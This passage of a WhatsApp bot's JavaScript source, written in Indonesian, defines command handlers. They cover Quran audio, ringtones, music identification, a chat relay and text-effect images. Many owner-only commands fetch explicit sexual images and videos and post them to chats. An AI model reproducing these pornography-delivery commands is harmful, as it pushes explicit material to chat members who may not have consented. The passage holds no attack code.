               if (!text) return m.reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} surah|ayah\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} 1|5`)
               m.reply(mess.wait)
                  var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var asma = await fetch(api('alfa', '/api/islam/alquran-audio2', {
                    ayat: m2,
                    surah: m1
                }, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                let short = data.result.data
                let key = '*Alquran Audio*\n\n'
                key += `• Surah : ${short.surah.name.short} (${short.surah.name.transliteration.en})\n`
                key += `• Arti : ${short.surah.name.translation.en} (${short.surah.name.translation.id})\n`
                key += `• Surah ke : ${short.surah.number}\n`
                key += `• Urutan : ${short.surah.sequence}\n`
                key += `• Total ayat : ${short.surah.numberOfVerses}\n`
                key += `• Wahyu : ${short.surah.revelation.arab} (${short.surah.revelation.id})\n`
                key += `• Tafsir : ${short.surah.tafsir.id}\n\n~~~~~~~~~~~~~~~~~~~\n\n`
                key += `• Juz : ${short.meta.juz}\n`
                key += `• Page : ${short.meta.page}\n`
                key += `• Manzil : ${short.meta.manzil}\n`
                key += `• Ruku : ${short.meta.ruku}\n`
                key += `• Quarte : ${short.meta.hizbQuarter}\n`
                key += `• Arab : ${short.text.arab}\n`
                key += `• Latin : ${short.text.transliteration.en}\n`
                key += `• Tr en : ${short.translation.en}\n`
                key += `• Tr id : ${short.translation.id}\n`
                key += `• Tafsir short : ${short.tafsir.id.short}\n`
                key += `• Tafsir long : ${short.tafsir.id.long}\n\n-----------------------------------\n\n`
                let aud_nya = await getBuffer(short.audio.primary)
                tganz.sendMessage(from, {
                    audio: {
                        url: short.audio.primary
                    },
                    mimetype: 'audio/aac',
                    ptt:true
                }, {
                    quoted: m
                })
                reply(key)
            }
            break
            //nsfw & sfw
            case 'cuddle':
            case 'foxgirl':
            case 'kemonomimi2':
            case 'woof':
            case 'holo2':
            case 'hug':
            case 'kiss':
            case 'lizard':
            case 'meowi':
            case 'neko2':
            case 'pat':
            case 'poke':
            case 'slap':
            case 'tickle': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Hᴀɪ ᴋᴀᴋ, Uɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ sɪʟᴀʜᴋᴀɴ ᴋᴀᴋᴀᴋ ɪᴋᴜᴛɪ ᴘᴇᴛᴜɴᴊᴜᴋ ᴅɪ ʙᴀᴡᴀʜ ʏᴀ :\n\nKᴇᴛɪᴋ : *${prefix}gambar ${command}*`)
            }
            break
           //NSFW
            case 'ahegao': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/ahegao.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.ahegao`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'ass': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/ass.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.ass`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'bdsm': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/bdsm.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.bdsm`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'blowjob': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/blowjob.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.blowjob`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'cukold': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/cukold.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.cukold`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'cum': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/cum.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.cum`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'femdom': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/femdom.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.femdom`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'foot': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/foot.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.foot`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'gangbang': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/gangbang.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.gangbang`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'gifs': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/gifs.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.gifs`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'glasses': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/glasses.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.glasses`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'hentai': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/hentai.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.hentai`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'porno': case 'porn': case 'bokep': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                anu = await hentai()
                result = anu[Math.floor(Math.random(), anu.length)]
                tganz.sendMessage(m.chat, { video: { url: result.video_1 }, caption: `⭔ ❑ *Jᴜᴅᴜʟ* : ${result.title}\n⭔ ❑ *Kᴀᴛᴇɢᴏʀɪ* : ${result.category}\n⭔ ❑ *Tɪᴘᴇ Fɪʟᴇ* : ${result.type}\n⭔ ❑ *Pᴇɴᴏɴᴛᴏɴ* : ${result.views_count}\n⭔ ❑ *Dɪʙᴀɢɪᴋᴀɴ Sᴇʙᴀɴʏᴀᴋ* : ${result.share_count}\n⭔ ❑ *Sᴜᴍʙᴇʀ* : ${result.link}\n⭔ ❑ *Lɪɴᴋ Vɪᴅᴇᴏ* : ${result.video_1}` }, { quoted: m })
            }
            break
            case 'manga': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/manga.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.manga`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'masturbation': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/masturbation.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.masturbation`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'megumin': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/megumin.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.megumin`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'neko': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/neko.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.neko`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'nekop': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/neko2.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.nekop`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'nekonime':
            case 'nekoanime': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/nekonime.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.nekonime`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'nadadering': 
            case 'dering': 
            case 'ndering': 
            case 'ringtone': {
           if (isBan) return reply(mess.ban)
		if (!text) return reply(`Mᴀᴜ ᴄᴀʀɪ ɴᴀᴅᴀ ᴅᴇʀɪɴɢ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Bʟᴀᴄᴋ Rᴏᴠᴇʀ*`)
		   m.reply(mess.wait)
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		tganz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
            case 'orgy': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/orgy.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.orgy`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'findermusic':
            case 'findmusic':
            case 'whatmusic':
            case 'findmusik': {
            if (isBan) return reply(mess.ban)
            if (/audio/.test(mime)) {
            let download = await tganz.downloadMediaMessage(quoted)
            const form = new BodyForm()
            form.append('sampleFile', download, { filename: getRandom('mp3') })
            axios.post(global.api("zenz", "/convert/whatmusic", {}, "apikey"), form.getBuffer(), { headers: { "content-type": `multipart/form-data; boundary=${form._boundary}`}
            }).then(({ data }) => {
                let caption = `⌈ *Fɪɴᴅᴇʀ Mᴜsɪᴄ* ⌋\n\n`
                caption += `⭔ ❑ Jᴜᴅᴜʟ Mᴜsɪᴋ : ${data.result.title}\n`
                caption += `⭔ ❑ Aʀᴛɪs : ${data.result.artist}\n`
                caption += `⭔ ❑ Aʟʙᴜᴍ : ${data.result.album}\n`
                caption += `⭔ ❑ Gᴇɴʀᴇ : ${data.result.genres}\n`
                caption += `⭔ ❑ Rɪʟɪs Pᴀᴅᴀ : ${data.result.crereleaseatedOn}\n`
                tganz.sendText(m.from, caption, m)
            })
        } else if (isUrl(text)) {
            let fetch = await fetchUrl(global.api("zenz", "/convert/whatmusic", { url: isUrl(text)[0] }, "apikey"))
            let caption = `⌈ *Fɪɴᴅᴇʀ Mᴜsɪᴄ* ⌋\n\n`
            let i = fetch.result
            caption += `⭔ ❑ Jᴜᴅᴜʟ Mᴜsɪᴋ : ${i.title}\n`
            caption += `⭔ ❑ Aʀᴛɪs : ${i.artist}\n`
            caption += `⭔ ❑ Aʟʙᴜᴍ : ${i.album}\n`
            caption += `⭔ ❑ Gᴇɴʀᴇ : ${i.genres}\n`
            caption += `⭔ ❑ Rɪʟɪs Pᴀᴅᴀ : ${i.crereleaseatedOn}\n`
            tganz.sendText(m.from, caption, m)
        } else {
            return m.reply(`ʙᴀʟᴀs ᴀᴜᴅɪᴏɴʏᴀ ʏᴀ ᴋᴀᴋ !!!\n*❑ ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command}* ( ʙᴀʟᴀs ᴀᴜᴅɪᴏɴʏᴀ )`, m.from, { quoted: m })
            reply(mess.wait)
        }
    }
       break
            case 'panties': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/panties.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.panties`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tentacles': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/tentacles.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.tentacles`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'thighs': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/thighs.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.thighs`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'zettai': {
               if (isBan) return reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/nsfw/zettai.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                let buttons = [                   
                    {buttonId: `.zettai`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*◈ Jᴀɴɢᴀɴ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴀɪᴋ ʏᴀ ᴋᴀᴋ 😏*`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'simisimi':
            case 'simi-simi':
            case 'sim':
            case 'simi': {
            if (isBan) return reply(mess.ban)
             if (!text) return reply(`*Aᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴋᴀᴋ ᴛᴀɴʏᴀᴋᴀɴ ᴘᴀᴅᴀ Sɪᴍɪ ?*`)
             if (!quoted) throw text
       axios.get(`https://api.lolhuman.xyz/api/simi?apikey=${lolkeysapi}&text=${text}&badword=true`).then(({ data }) => {
				m.reply(`\n${data.result}\n`)
		   	})
       }
         break
            //Photooxy
            case 'battlegrounds-logo':
            case 'battlefield4':
            case 'text-8bit': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ`)
                m.reply(mess.wait)
                mm = args.join(' ')
                m1 = mm.split("|")[0];
                m2 = mm.split("|")[1];
                reply(mess.wait)
                let res = await fetch(global.api("alfa", '/api/photooxy/' + command, {
                    text: m1,
                    text2: m2
                }, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                tganz.sendFile(m.chat, img, 'photooxy.jpg', mess.done, m)
            }
            break
            case 'typography-flower':
            case 'under-flower':
            case 'bevel-text':
            case 'silk-text':
            case 'sweet-andy':
            case 'smoke-typography':
            case 'carvedwood':
            case 'scary-cemetery':
            case 'royallook':
            case 'coffeecup2':
            case 'illuminated':
            case 'harry-potter2':
            case 'birthday-cake':
            case 'embroidery':
            case 'flaming':
            case 'furtext':
            case 'nightsky':
            case 'glow-rainbow':
            case 'gradient-avatar':
            case 'white-cube':
            case 'graffiti-cover':
            case 'rainbow-shine':
            case 'smoky-neon':
            case 'quotes-underfall':
            case 'vector-nature':
            case 'yellow-rose':
            case 'love-text':
            case 'underwater-ocean':
            case 'nature-text':
            case 'wolf-metal':
            case 'summer-text':
            case 'wooden-board':
            case 'quote-wood':
            case 'love-text':
            case 'quotes-undergrass':
            case 'naruto-banner':
            case 'love-message':
            case 'textoncup2':
            case 'burn-paper':
            case 'smoke':
            case 'romantic-messages':
            case 'shadow-sky':
            case 'text-cup':
            case 'coffecup': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ`)
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/photooxy/' + command, {
                    text: text
                }, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                tganz.sendFile(m.chat, img, 'photooxy.jpg', mess.done, m)
            }
            break
         case 'tomp4': case 'tovideo': case 'tovid': {
               if (isBan) return reply(mess.ban)
           if (!m.quoted) return reply('Rᴇᴘʟʏ sᴛɪᴄᴋᴇʀ Gɪғɴʏᴀ !')
           if (!/webp/.test(mime)) return reply(`Bᴀʟᴀs sᴛɪᴄᴋᴇʀ Gɪғɴʏᴀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : *${prefix + command}*`)
           reply(mess.wait)
